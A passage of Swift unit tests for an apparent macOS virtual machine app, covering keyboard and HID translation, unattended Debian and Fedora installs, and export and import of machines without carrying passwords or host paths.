        XCTAssertEqual(try String(contentsOf: files.auxiliaryStorage, encoding: .utf8), "aux-before")
        XCTAssertFalse(FileManager.default.fileExists(atPath: files.savedState.path))
        XCTAssertEqual(MacRestorePoints.list(files).count, 1, "restoring keeps the point")
        try MacRestorePoints.delete(points[0])
        XCTAssertTrue(MacRestorePoints.list(files).isEmpty)
    }
}

/// The keyboard paths that went wrong on 2026-10-26, as tests: a key or
/// modifier left down in Windows is a silent, maddening failure.
final class KeyboardPathTests: XCTestCase {
    // Mac virtual key codes.
    let leftShift = 0x38, rightShift = 0x3C, leftCommand = 0x37, rightOption = 0x3D
    // Device-dependent flag bits.
    let lShiftBit: UInt = 0x2, rShiftBit: UInt = 0x4

    func testBothShiftsReleaseSeparately() {
        // Left Shift down, then Right Shift down, then Right Shift up: the
        // device-independent .shift is still set, but Right Shift is up.
        XCTAssertEqual(ModifierSides.isDown(virtualKey: leftShift, flags: lShiftBit), true)
        XCTAssertEqual(ModifierSides.isDown(virtualKey: rightShift, flags: lShiftBit | rShiftBit), true)
        XCTAssertEqual(ModifierSides.isDown(virtualKey: rightShift, flags: lShiftBit), false)
        XCTAssertEqual(ModifierSides.isDown(virtualKey: leftShift, flags: 0), false)
    }

    func testEveryModifierHasItsOwnBit() {
        let keys = [0x3B, 0x38, 0x3C, 0x37, 0x36, 0x3A, 0x3D, 0x3E]
        let bits = keys.map(ModifierSides.sideMask(forVirtualKey:))
        XCTAssertFalse(bits.contains(0))
        XCTAssertEqual(Set(bits).count, keys.count)
        XCTAssertNil(ModifierSides.isDown(virtualKey: 0x00, flags: 0xFFFF), "a letter isn't a modifier")
    }

    func testFnReleaseMatchesPressEvenIfFnLetGoFirst() {
        var t = WindowsKeyTranslator()
        XCTAssertNil(t.translate(usage: HIDKeyMap.fnUsage, pressed: true))
        XCTAssertEqual(t.translate(usage: 0x2A, pressed: true), .key(0x153, down: true))    // Fn-Backspace: Delete
        XCTAssertNil(t.translate(usage: HIDKeyMap.fnUsage, pressed: false))
        XCTAssertEqual(t.translate(usage: 0x2A, pressed: false), .key(0x153, down: false))  // Delete up, not Backspace
        XCTAssertEqual(t.translate(usage: 0x2A, pressed: true), .key(0x0E, down: true))     // plain Backspace now
        XCTAssertTrue(t.pressed.contains(0x0E))
    }

    func testISOSwapOnlyWhenAsked() {
        var plain = WindowsKeyTranslator()
        XCTAssertEqual(plain.translate(usage: 0x35, pressed: true), .key(0x29, down: true))
        var iso = WindowsKeyTranslator()
        iso.appleISO = true
        XCTAssertEqual(iso.translate(usage: 0x35, pressed: true), .key(0x56, down: true))
        XCTAssertEqual(iso.translate(usage: 0x64, pressed: true), .key(0x29, down: true))
    }

    func testQEMUNumbers() {
        XCTAssertEqual(HIDKeyMap.qemuNumber(forScancode: 0x1E), 0x1E)    // a
        XCTAssertEqual(HIDKeyMap.qemuNumber(forScancode: 0x153), 0xD3)   // Delete, E0 53
        XCTAssertEqual(HIDKeyMap.qemuNumber(forScancode: 0x15B), 0xDB)   // left Windows, E0 5B
        XCTAssertEqual(HIDKeyMap.qemuNumber(forScancode: 0x11D), 0x9D)   // right Control, E0 1D
    }

    func testPauseGoesItsOwnWay() {
        var t = WindowsKeyTranslator()
        XCTAssertEqual(t.translate(usage: HIDKeyMap.pauseUsage, pressed: true), .pause(down: true))
        XCTAssertEqual(t.translate(usage: HIDKeyMap.pauseUsage, pressed: false), .pause(down: false))
        XCTAssertTrue(t.pressed.isEmpty)
    }

    func testReleaseAllLetsGoOfEverything() {
        var t = WindowsKeyTranslator()
        _ = t.translate(usage: 0xE3, pressed: true)   // Windows key
        _ = t.translate(usage: 0x04, pressed: true)   // a
        XCTAssertEqual(Set(t.releaseAll()), [0x15B, 0x1E])
        XCTAssertTrue(t.pressed.isEmpty)
        XCTAssertEqual(t.translate(usage: 0x04, pressed: false), .key(0x1E, down: false), "a late key-up still maps")
    }
}

final class HIDKeyMapTests: XCTestCase {
    func testCommonKeys() {
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x04), 0x1E)        // a
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x1D), 0x2C)        // z
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x1E), 0x02)        // 1
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x27), 0x0B)        // 0
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x28), 0x1C)        // Return
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x39), 0x3A)        // Caps Lock: JAWS and NVDA laptop key
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x3A), 0x3B)        // F1
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x45), 0x58)        // F12
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x49), 0x152)       // Insert, the desktop screen reader key
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x52), 0x148)       // Up arrow
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x62), 0x52)        // keypad 0, also Insert with Num Lock off
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0xE3), 0x15B)       // left Windows (Command on a Mac keyboard)
        XCTAssertNil(HIDKeyMap.scancode(forUsage: 0x01))                // rollover error
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x7F), 0x120)       // Mute
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x80), 0x130)       // Volume Up
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x81), 0x12E)       // Volume Down
        XCTAssertEqual(HIDKeyMap.scancode(forUsage: 0x85), 0x7E)        // keypad comma
        XCTAssertEqual(HIDKeyMap.fnLayer[0x2A], 0x153)                 // Fn-Backspace: Delete
        XCTAssertEqual(HIDKeyMap.fnLayer[0x50], 0x147)                 // Fn-Left: Home
        XCTAssertEqual(HIDKeyMap.isoSwapped(0x35), 0x64)
        XCTAssertEqual(HIDKeyMap.isoSwapped(0x64), 0x35)
        XCTAssertEqual(HIDKeyMap.isoSwapped(0x04), 0x04)
        XCTAssertNil(HIDKeyMap.scancode(forUsage: HIDKeyMap.pauseUsage), "Pause goes through sendPause")
    }

    /// Two keys never send the same scancode, except the two backslash
    /// positions PC keyboards share.
    func testNoUnexpectedDuplicates() {
        var seen: [Int: Int] = [:]
        for (usage, code) in HIDKeyMap.table {
            if let other = seen[code] {
                XCTAssertEqual(Set([usage, other]), [0x31, 0x32], "usages \(usage) and \(other) both send \(code)")
            }
            seen[code] = usage
        }
    }
}

// MARK: - Report descriptors (2026-10-29)

final class HIDReportDescriptorTests: XCTestCase {
    private func usages(_ bytes: [UInt8]) -> [String] {
        HIDReportDescriptor.applicationUsages(Data(bytes)).map { String(format: "%02x/%02x", $0.page, $0.usage) }
    }

    /// The boot keyboard of the HID spec's appendix.
    func testAKeyboard() {
        let keyboard: [UInt8] = [
            0x05, 0x01, 0x09, 0x06, 0xa1, 0x01,
            0x05, 0x07, 0x19, 0xe0, 0x29, 0xe7, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
            0x95, 0x01, 0x75, 0x08, 0x81, 0x01,
            0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
            0x95, 0x01, 0x75, 0x03, 0x91, 0x01,
            0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x65, 0x05, 0x07, 0x19, 0x00, 0x29, 0x65, 0x81, 0x00,
            0xc0,
        ]
        XCTAssertEqual(usages(keyboard), ["01/06"])
        XCTAssertTrue(HIDReportDescriptor.hasKeyboard(Data(keyboard)))
    }

    func testAGamePadHasNoKeys() {
        let pad: [UInt8] = [
            0x05, 0x01, 0x09, 0x05, 0xa1, 0x01,
            0x05, 0x09, 0x19, 0x01, 0x29, 0x10, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x10, 0x81, 0x02,
            0x05, 0x01, 0x09, 0x30, 0x09, 0x31, 0x15, 0x81, 0x25, 0x7f, 0x75, 0x08, 0x95, 0x02, 0x81, 0x02,
            0xc0,
        ]
        XCTAssertEqual(usages(pad), ["01/05"])
        XCTAssertFalse(HIDReportDescriptor.hasKeyboard(Data(pad)))
    }

    /// The APH Mantis Q40's collections, as macOS listed its usage pairs:
    /// a braille display whose keys are a keyboard too.
    func testABrailleDisplayWithAKeyboard() {
        func collection(page: UInt8, usage: UInt8, id: UInt8) -> [UInt8] {
            [0x05, page, 0x09, usage, 0xa1, 0x01, 0x85, id,
             0x09, 0x01, 0x15, 0x00, 0x26, 0xff, 0x00, 0x75, 0x08, 0x95, 0x01, 0x81, 0x02, 0xc0]
        }
        let mantis = collection(page: 0x93, usage: 0x01, id: 1) + collection(page: 0x41, usage: 0x01, id: 2)
            + collection(page: 0x01, usage: 0x06, id: 3) + collection(page: 0x01, usage: 0x00, id: 4)
        XCTAssertEqual(usages(mantis), ["93/01", "41/01", "01/06", "01/00"])
        XCTAssertTrue(HIDReportDescriptor.hasKeyboard(Data(mantis)))
    }

    /// Only a top-level application collection counts, as in macOS's pairs.
    func testANestedKeyboardCollectionDoesNotCount() {
        let remote: [UInt8] = [
            0x05, 0x0c, 0x09, 0x01, 0xa1, 0x01,
            0x05, 0x01, 0x09, 0x06, 0xa1, 0x02, 0x15, 0x00, 0x25, 0x01, 0x75, 0x01, 0x95, 0x01, 0x81, 0x02, 0xc0,
            0xc0,
        ]
        XCTAssertEqual(usages(remote), ["0c/01"])
        XCTAssertFalse(HIDReportDescriptor.hasKeyboard(Data(remote)))
    }

    func testPagesAsTheSpecHasThem() {
        // A 4-byte usage carries its own page.
        XCTAssertEqual(usages([0x0b, 0x06, 0x00, 0x01, 0x00, 0xa1, 0x01, 0xc0]), ["01/06"])
        // A shorter one takes the page in force at the collection.
        XCTAssertEqual(usages([0x09, 0x06, 0x05, 0x01, 0xa1, 0x01, 0xc0]), ["01/06"])
        // Push and Pop.
        XCTAssertEqual(usages([0x05, 0x01, 0xa4, 0x05, 0x0c, 0xb4, 0x09, 0x06, 0xa1, 0x01, 0xc0]), ["01/06"])
        // A long item is skipped.
        XCTAssertEqual(usages([0xfe, 0x02, 0x10, 0xaa, 0xbb, 0x05, 0x01, 0x09, 0x06, 0xa1, 0x01, 0xc0]), ["01/06"])
    }

    func testACutOffDescriptorEndsTheRead() {
        XCTAssertEqual(usages([0x05, 0x01, 0x09]), [])
        XCTAssertEqual(usages([0x05, 0x01, 0x09, 0x06, 0xa1]), [])
        XCTAssertEqual(usages([0xfe]), [])
        XCTAssertFalse(HIDReportDescriptor.hasKeyboard(Data()))
    }
}

// MARK: - Debian, the Ubuntu way

final class DebianInstallTests: XCTestCase {
    private let account = UbuntuAccount(realName: "Amena T", userName: "amena", passwordHash: "$6$salt$hash",
                                        signInAutomatically: true, keyboardLayout: "gb", keyboardVariant: "mac")

    /// The arm64 netinst's menu: the answers go before "---", the menu
    /// boots by itself, and the installed-machine guard comes first.
    func testBootMenuEdit() throws {
        let menu = """
        if loadfont $prefix/font.pf2 ; then
          set gfxmode=800x600
        fi
        menuentry --hotkey=i 'Install' {
            set background_color=black
            linux    /install.a64/vmlinuz  --- quiet
            initrd   /install.a64/initrd.gz
        }
        menuentry --hotkey=g 'Graphical install' {
            linux    /install.a64/vmlinuz vga=788 --- quiet
        }
        """
        let edited = try XCTUnwrap(UbuntuInstallPipeline.editedDebianBootMenu(menu))
        XCTAssertTrue(edited.hasPrefix(UbuntuInstallPipeline.markerGuardLine))
        XCTAssertTrue(edited.contains("linux    /install.a64/vmlinuz \(UbuntuInstallPipeline.debianKernelArguments)  --- quiet"))
        XCTAssertTrue(edited.contains("set timeout=1"))
        XCTAssertEqual(edited.components(separatedBy: UbuntuInstallPipeline.debianKernelArguments).count, 2, "only the first entry")
        XCTAssertNil(UbuntuInstallPipeline.editedDebianBootMenu("menuentry 'x' { linux /casper/vmlinuz }"))
        // The keyboard goes on the installer's command line too (2026-10-26).
        var account = UbuntuAccount(realName: "A", userName: "a", passwordHash: "$6$x$y", signInAutomatically: true)
        account.keyboardLayout = "gb"
        account.keyboardVariant = "mac"
        let words = UbuntuInstallPipeline.debianKeyboardArguments(account)
        XCTAssertEqual(words, "keymap=gb keyboard-configuration/layoutcode=gb keyboard-configuration/variantcode=mac")
        let withKeyboard = try XCTUnwrap(UbuntuInstallPipeline.editedDebianBootMenu(menu, keyboard: words))
        XCTAssertTrue(withKeyboard.contains("\(UbuntuInstallPipeline.debianKernelArguments) \(words)"))
        let script = UbuntuInstallPipeline.debianSetupScript(account: account)
        XCTAssertTrue(script.contains(#"s/^XKBLAYOUT=.*/XKBLAYOUT="gb"/"#), "the setup script writes the keyboard itself")
        XCTAssertTrue(script.contains(#"s/^XKBVARIANT=.*/XKBVARIANT="mac"/"#))
    }

    func testPreseedAnswersEverything() {
        let preseed = UbuntuInstallPipeline.debianPreseed(account: account, hostName: "amenas-debian", timeZone: "America/Chicago")
        for line in ["d-i passwd/username string amena", "d-i passwd/user-password-crypted password $6$salt$hash",
                     "d-i keyboard-configuration/xkb-keymap select gb", "d-i partman-auto/disk string /dev/nvme0n1",
                     "d-i time/zone string America/Chicago", "orca spice-vdagent qemu-guest-agent spice-webdavd",
                     "d-i preseed/late_command string sh /cdrom/nocloud/setup.sh",
                     "d-i debian-installer/exit/poweroff boolean true"] {
            XCTAssertTrue(preseed.contains(line), line)
        }
    }

    func testSetupScriptIsDebians() {
        let script = UbuntuInstallPipeline.debianSetupScript(account: account)
        XCTAssertTrue(script.hasPrefix("#!/bin/sh"))
        XCTAssertFalse(script.contains("curtin"))
        XCTAssertTrue(script.contains("in-target dconf update"))
        XCTAssertTrue(script.contains("/etc/gdm3/daemon.conf"))
        XCTAssertTrue(script.contains("AVMDONE.TAG"))
        XCTAssertTrue(script.contains("screen-reader-enabled=true"))
    }

    func testDebianIsLinux() {
        XCTAssertTrue(GuestOS.debian.isLinux)
        XCTAssertTrue(GuestOS.ubuntu.isLinux)
        XCTAssertFalse(GuestOS.windows.isLinux)
        XCTAssertFalse(GuestOS.macOS.isLinux)
    }

    /// Settings hides what the guest's software sources can't provide.
    func testSettingsOnlyOfferWhatTheGuestCanHave() {
        XCTAssertFalse(GuestOS.almalinux.hasRemoteDesktopHost)
        XCTAssertFalse(GuestOS.rocky.hasRemoteDesktopHost)
        for os: GuestOS in [.windows, .ubuntu, .debian, .fedora, .kali, .opensuse, .macOS] {
            XCTAssertTrue(os.hasRemoteDesktopHost, os.rawValue)
        }
        XCTAssertFalse(GuestOS.rocky.hasSharedFolderService)
        XCTAssertFalse(GuestOS.macOS.hasSharedFolderService, "macOS has its own sharing")
        XCTAssertTrue(GuestOS.almalinux.hasSharedFolderService)
        XCTAssertTrue(GuestOS.windows.hasSharedFolderService)
    }
}

// MARK: - Export and import (2026-10-26)

/// A machine backed up and brought back must start, must not carry its
/// passwords with it, and must never collide with the machine it came from.
final class MachineArchiveTests: XCTestCase {
    private var root: URL!
    private let fm = FileManager.default

    override func setUpWithError() throws {
        root = fm.temporaryDirectory.appendingPathComponent("avm-archive-\(UUID().uuidString)")
        try fm.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? fm.removeItem(at: root)
    }

    private func folder(_ name: String) throws -> URL {
        let url = root.appendingPathComponent(name, isDirectory: true)
        try fm.createDirectory(at: url, withIntermediateDirectories: true)
        return url
    }

    /// A sparse file: `size` long, with `marker` at the start and in the middle.
    private func writeSparse(_ url: URL, size: off_t, marker: String) throws {
        let fd = open(url.path, O_WRONLY | O_CREAT | O_TRUNC, 0o644)
        XCTAssertGreaterThanOrEqual(fd, 0)
        defer { close(fd) }
        XCTAssertEqual(ftruncate(fd, size), 0)
        let bytes = Array(marker.utf8)
        _ = pwrite(fd, bytes, bytes.count, 0)
        _ = pwrite(fd, bytes, bytes.count, size / 2)
    }

    private func installedWindows() throws -> (VMConfiguration, URL) {
        let dir = try folder("source-vm")
        try writeSparse(dir.appendingPathComponent("disk.qcow2"), size: 64 * 1_048_576, marker: "QFI")
        try Data("nvram".utf8).write(to: dir.appendingPathComponent("nvram.fd"))
        let tpm = try folder("source-vm/tpm-state")
        try Data("tpm".utf8).write(to: tpm.appendingPathComponent("tpm2-00.permall"))
        let point = try folder("source-vm/restore-points/avm-1")
        try Data("Fresh install".utf8).write(to: point.appendingPathComponent("label.txt"))
        try Data("fat".utf8).write(to: dir.appendingPathComponent("autounattend.img"))
        try Data("sock".utf8).write(to: dir.appendingPathComponent("qmp.sock"))
        try Data("serial".utf8).write(to: dir.appendingPathComponent("firmware-serial.log"))
        var answers = WindowsSetupAnswers()
        answers.localAccount = .init(userName: "amena", displayName: "Amena", encodedPassword: "c2VjcmV0")
        try answers.save(inVMDirectory: dir)
        var config = VMConfiguration(name: "Work PC", diskImagePath: dir.appendingPathComponent("disk.qcow2").path,
                                     installISOPath: "/Users/someone/Downloads/Win11.iso",
                                     storageFolderPath: dir.path)
        config.secureBoot = true
        return (config, dir)
    }

    private func export(_ config: VMConfiguration, from dir: URL, includeRestorePoints: Bool = true) throws -> URL {
        let package = try folder("backup").appendingPathComponent(MachineArchive.packageName(for: config))
        let plan = try MachineArchive.exportPlan(vmDirectory: dir, isMac: config.guestOS == .macOS,
                                                 includeRestorePoints: includeRestorePoints)
        let manifest = try MachineArchive.manifestData(for: config, appVersion: "test")
        try MachineArchive.writePackage(plan: plan, from: dir, to: package, manifest: manifest) { _, _ in }
        return package
    }

    func testWindowsRoundTrip() throws {
        let (original, dir) = try installedWindows()
        XCTAssertNil(MachineArchive.exportProblem(for: original, vmDirectory: dir))
        // A password hash left behind must not travel even so.
        try UbuntuAccount(realName: "A", userName: "amena", passwordHash: "$6$a$b", signInAutomatically: false)
            .save(inVMDirectory: dir)
        let package = try export(original, from: dir)
        XCTAssertEqual(package.lastPathComponent, "Work PC.avmvm")

        // What went, and what didn't.
        let exists = { (name: String) in self.fm.fileExists(atPath: package.appendingPathComponent(name).path) }
        for name in ["disk.qcow2", "nvram.fd", "tpm-state/tpm2-00.permall", "restore-points/avm-1/label.txt",
                     "autounattend.img", MachineArchive.manifestName, WindowsSetupAnswers.fileName] {
            XCTAssertTrue(exists(name), "\(name) should be in the package")
        }
        for name in ["qmp.sock", "firmware-serial.log", UbuntuAccount.fileName] {
            XCTAssertFalse(exists(name), "\(name) should not be in the package")
        }
        XCTAssertNil(WindowsSetupAnswers.load(fromVMDirectory: package)?.localAccount?.encodedPassword)
        XCTAssertEqual(WindowsSetupAnswers.load(fromVMDirectory: package)?.localAccount?.userName, "amena")
        let manifestText = try String(contentsOf: package.appendingPathComponent(MachineArchive.manifestName), encoding: .utf8)
        XCTAssertFalse(manifestText.contains("c2VjcmV0"))
        XCTAssertFalse(manifestText.contains(dir.path), "no path from the old Mac's machine folder")
        XCTAssertFalse(try fm.contentsOfDirectory(atPath: package.deletingLastPathComponent().path).contains { $0.contains("partial") })

        // Back in, as a new machine.
        let manifest = try MachineArchive.readPackage(package)
        XCTAssertNil(manifest.configuration.storageFolderPath)
        XCTAssertEqual(manifest.configuration.diskImagePath, "disk.qcow2")
        let container = try folder("VMs")
        let id = UUID()
        let newFolder = try MachineArchive.copyIn(plan: try MachineArchive.importPlan(package: package), from: package,
                                                  container: container, id: id) { _, _ in }
        XCTAssertEqual(newFolder.lastPathComponent, id.uuidString)
        let imported = MachineArchive.importedConfiguration(manifest.configuration, id: id, folder: newFolder,
                                                            existingNames: [original.name])
        XCTAssertNotEqual(imported.id, original.id)
        XCTAssertEqual(imported.name, "Work PC 2")
        XCTAssertNil(imported.storageFolderPath)
        XCTAssertEqual(imported.diskImagePath, newFolder.appendingPathComponent("disk.qcow2").path)
        XCTAssertEqual(imported.secureBoot, true)
        // The file name only (2026-10-29, seventh audit): the folder under
        // the user's home travelled in a package for other people. Non-empty
        // is what the install-complete check needs.
        XCTAssertEqual(imported.installISOPath, "Win11.iso", "the name is kept, so the install-complete check still runs")
        XCTAssertEqual(try Data(contentsOf: newFolder.appendingPathComponent("disk.qcow2")),
                       try Data(contentsOf: dir.appendingPathComponent("disk.qcow2")))
        XCTAssertFalse(fm.fileExists(atPath: newFolder.appendingPathComponent(MachineArchive.manifestName).path))
        let mode = try fm.attributesOfItem(atPath: newFolder.appendingPathComponent(WindowsSetupAnswers.fileName).path)[.posixPermissions] as? Int
        XCTAssertEqual(mode, 0o600)
        XCTAssertEqual(try fm.contentsOfDirectory(atPath: container.path), [id.uuidString], "no working folder left behind")
    }

    func testExportingAgainReplacesThePackage() throws {
        let (config, dir) = try installedWindows()
        let package = try export(config, from: dir)
        try Data("changed".utf8).write(to: dir.appendingPathComponent("nvram.fd"))
        let plan = try MachineArchive.exportPlan(vmDirectory: dir, isMac: false, includeRestorePoints: true)
        try MachineArchive.writePackage(plan: plan, from: dir, to: package,
                                        manifest: try MachineArchive.manifestData(for: config, appVersion: nil)) { _, _ in }
        XCTAssertEqual(try String(contentsOf: package.appendingPathComponent("nvram.fd"), encoding: .utf8), "changed")
    }

    func testUnfinishedInstallsAreRefused() throws {
        let (config, dir) = try installedWindows()
        try Data("iso".utf8).write(to: dir.appendingPathComponent("install-avm.iso"))
        XCTAssertNotNil(MachineArchive.exportProblem(for: config, vmDirectory: dir))
        try fm.removeItem(at: dir.appendingPathComponent("install-avm.iso"))
        try fm.removeItem(at: dir.appendingPathComponent("autounattend.img"))
        XCTAssertNotNil(MachineArchive.exportProblem(for: config, vmDirectory: dir), "never started: nothing installed")
    }

    private func macMachine(_ name: String, identity: String) throws -> (VMConfiguration, URL) {
        let dir = try folder(name)
        let files = MacGuestFiles(folder: dir)
        try writeSparse(files.disk, size: 32 * 1_048_576, marker: "APFS")
        try Data("aux".utf8).write(to: files.auxiliaryStorage)
        try Data("model".utf8).write(to: files.hardwareModel)
        try Data(identity.utf8).write(to: files.machineIdentifier)
        try Data("mac".utf8).write(to: files.macAddress)
        var config = VMConfiguration(name: name, diskImagePath: files.disk.path, storageFolderPath: dir.path)
        config.guestOSName = GuestOS.macOS.rawValue
        return (config, dir)
    }

    func testMacOSMachineKeepsItsIdentity() throws {
        let (config, dir) = try macMachine("Sequoia", identity: "id-1")
        let files = MacGuestFiles(folder: dir)
        try MacRestorePoints.take(files, name: "Before update")

        try Data("state".utf8).write(to: files.savedState)
        XCTAssertNotNil(MachineArchive.exportProblem(for: config, vmDirectory: dir), "a saved machine is mid-session")
        try fm.removeItem(at: files.savedState)
        XCTAssertNil(MachineArchive.exportProblem(for: config, vmDirectory: dir))

        let withPoints = try MachineArchive.exportPlan(vmDirectory: dir, isMac: true, includeRestorePoints: true)
        XCTAssertTrue(withPoints.hasRestorePoints)
        XCTAssertGreaterThan(withPoints.restorePointBytes, 0)
        let package = try export(config, from: dir, includeRestorePoints: false)
        XCTAssertFalse(fm.fileExists(atPath: package.appendingPathComponent("restore-points").path))
        XCTAssertTrue(fm.fileExists(atPath: package.appendingPathComponent("MACAddress").path))
        let manifest = try MachineArchive.readPackage(package)
        XCTAssertEqual(manifest.configuration.guestOS, .macOS)
        XCTAssertEqual(manifest.configuration.diskImagePath, "macos-disk.img")

        let (other, _) = try macMachine("Other Mac", identity: "id-2")
        let twins = MachineArchive.macOSIdentityTwins(of: package, among: [config, other])
        XCTAssertEqual(twins.map(\.id), [config.id], "the original is the same Mac to macOS")
        XCTAssertTrue(MachineArchive.macOSIdentityTwins(of: package, among: [config], excluding: config.id).isEmpty)
    }

    func testBadPackagesSayWhatIsWrong() throws {
        func message(_ url: URL) -> String {
            do {
                _ = try MachineArchive.readPackage(url)
                return "accepted"
            } catch {
                return error.localizedDescription
            }
        }
        let file = root.appendingPathComponent("notes.avmvm")
        try Data("x".utf8).write(to: file)
        XCTAssertTrue(message(file).contains("is a file"))

        let empty = try folder("Empty.avmvm")
        XCTAssertTrue(message(empty).contains("has no \(MachineArchive.manifestName)"))

        try Data("{not json".utf8).write(to: empty.appendingPathComponent(MachineArchive.manifestName))
        XCTAssertTrue(message(empty).contains("can't read"))

        let (config, dir) = try installedWindows()
        let package = try export(config, from: dir)
        try fm.removeItem(at: package.appendingPathComponent("disk.qcow2"))
        XCTAssertTrue(message(package).contains("missing disk.qcow2"))
        try fm.removeItem(at: package.appendingPathComponent("autounattend.img"))
        XCTAssertTrue(message(package).contains("missing disk.qcow2 and autounattend.img"))

        var newer = try JSONSerialization.jsonObject(with: Data(contentsOf: package.appendingPathComponent(MachineArchive.manifestName))) as! [String: Any]
        newer["format"] = MachineArchive.formatVersion + 1
        try JSONSerialization.data(withJSONObject: newer).write(to: package.appendingPathComponent(MachineArchive.manifestName))
        XCTAssertTrue(message(package).contains("newer AVM"))

        XCTAssertTrue(message(root.appendingPathComponent("gone.avmvm")).contains("can't find"))
    }

    /// The copy used when cloning isn't possible (another drive) keeps a
    /// sparse disk sparse and every byte the same.
    func testCopyKeepsHoles() throws {
        let source = root.appendingPathComponent("sparse.img")
        try writeSparse(source, size: 256 * 1_048_576, marker: "DATA")
        let destination = root.appendingPathComponent("copy.img")
        var reported: UInt64 = 0
        try MachineFileCopier.copyFile(source, to: destination, permissions: 0o640) { reported = $0 }
        XCTAssertEqual(try Data(contentsOf: destination), try Data(contentsOf: source))
        let plan = try MachineFileCopier.plan(source: root) { $0 != "sparse.img" }
        let copied = try MachineFileCopier.plan(source: root) { $0 != "copy.img" }
        XCTAssertEqual(plan.logicalBytes, copied.logicalBytes)
        XCTAssertLessThan(copied.allocatedBytes, 16 * 1_048_576, "the holes stayed holes")
        XCTAssertLessThan(reported, 64 * 1_048_576, "only the parts with data were read")
        let mode = try fm.attributesOfItem(atPath: destination.path)[.posixPermissions] as? Int
        XCTAssertEqual(mode, 0o640)
    }

    /// Export to another drive, where nothing can be cloned. Opt-in: set
    /// AVM_ARCHIVE_TEST_VOLUME to a folder on another volume, such as an
    /// exFAT disk image (hdiutil create -size 200m -fs ExFAT ...).
    func testExportToAnotherDrive() throws {
        guard let path = ProcessInfo.processInfo.environment["AVM_ARCHIVE_TEST_VOLUME"] else {
            throw XCTSkip("set AVM_ARCHIVE_TEST_VOLUME to a folder on another volume")
        }
        let (config, dir) = try installedWindows()
        let drive = URL(fileURLWithPath: path).appendingPathComponent("avm-test-\(UUID().uuidString)")
        try fm.createDirectory(at: drive, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: drive) }
        XCTAssertFalse(MachineFileCopier.sameVolume(dir, drive))
        let plan = try MachineArchive.exportPlan(vmDirectory: dir, isMac: false, includeRestorePoints: true)
        let needed = MachineFileCopier.bytesNeeded(plan, from: dir, to: drive)
        let fsName = MachineFileCopier.fileSystemName(drive) ?? "?"
        if fsName == "exfat" || fsName == "msdos" {
            XCTAssertEqual(needed, plan.logicalBytes, "no sparse files there: the full length")
        }
        let package = drive.appendingPathComponent(MachineArchive.packageName(for: config))
        var calls = 0
        try MachineArchive.writePackage(plan: plan, from: dir, to: package,
                                        manifest: try MachineArchive.manifestData(for: config, appVersion: nil)) { _, _ in calls += 1 }
        XCTAssertGreaterThan(calls, 0)
        XCTAssertEqual(try Data(contentsOf: package.appendingPathComponent("disk.qcow2")),
                       try Data(contentsOf: dir.appendingPathComponent("disk.qcow2")))
        let manifest = try MachineArchive.readPackage(package)
        let container = try folder("VMs-from-drive")
        let back = try MachineArchive.copyIn(plan: try MachineArchive.importPlan(package: package), from: package,
                                             container: container, id: UUID()) { _, _ in }
        XCTAssertEqual(try Data(contentsOf: back.appendingPathComponent("disk.qcow2")),
                       try Data(contentsOf: dir.appendingPathComponent("disk.qcow2")))
        XCTAssertEqual(manifest.configuration.name, "Work PC")
    }

    func testSpaceNeededAndNames() throws {
        let (config, dir) = try installedWindows()
        let plan = try MachineArchive.exportPlan(vmDirectory: dir, isMac: false, includeRestorePoints: true)
        XCTAssertLessThan(MachineFileCopier.bytesNeeded(plan, from: dir, to: root), plan.logicalBytes,
                          "on the same APFS volume the copy is a clone")
        XCTAssertEqual(MachineArchive.uniqueName("Work PC", existing: ["work pc", "Work PC 2"]), "Work PC 3")
        XCTAssertEqual(MachineArchive.uniqueName("Work PC", existing: []), "Work PC")
        var odd = config; odd.name = "../a/b:c"
        XCTAssertEqual(MachineArchive.packageName(for: odd), "-a-b-c.avmvm")
        XCTAssertEqual(MachineArchive.placeName(of: URL(fileURLWithPath: "/Volumes/Backup/AVM")), "the drive Backup")
        XCTAssertEqual(MachineArchive.placeName(of: root), "your Mac")
        XCTAssertTrue(MachineArchive.exportSkips("SavedState.vzvmsave"))
        XCTAssertTrue(MachineArchive.exportSkips("restore-points/x/.macos-disk.img.restoring"))
        XCTAssertFalse(MachineArchive.exportSkips("restore-points/avm-1/nvram.fd"))
    }
}

// MARK: - Fedora, the Ubuntu way (2026-10-26)

final class FedoraInstallTests: XCTestCase {
    private let account = UbuntuAccount(realName: "Amena O'Neil", userName: "amena", passwordHash: "$6$salt$hash",
                                        signInAutomatically: true, keyboardLayout: "gb", keyboardVariant: "mac")

    /// The aarch64 Everything netinstall's EFI menu (Fedora 44), cut down:
    /// it starts on the media-check entry, after 60 seconds.
    private let menu = """
        set default="1"

        set timeout=60
        ### END /etc/grub.d/00_header ###

        search --no-floppy --set=root -l 'Fedora-E-dvd-aarch64-44'

        menuentry 'Install Fedora 44' --class red --class gnu-linux --class gnu --class os {
        \tlinux /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=Fedora-E-dvd-aarch64-44 ro
        \tinitrd /images/pxeboot/initrd.img
        }
        menuentry 'Test this media & install Fedora 44' --class red --class gnu-linux --class gnu --class os {
        \tlinux /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=Fedora-E-dvd-aarch64-44 rd.live.check
        \tinitrd /images/pxeboot/initrd.img
        }
        """

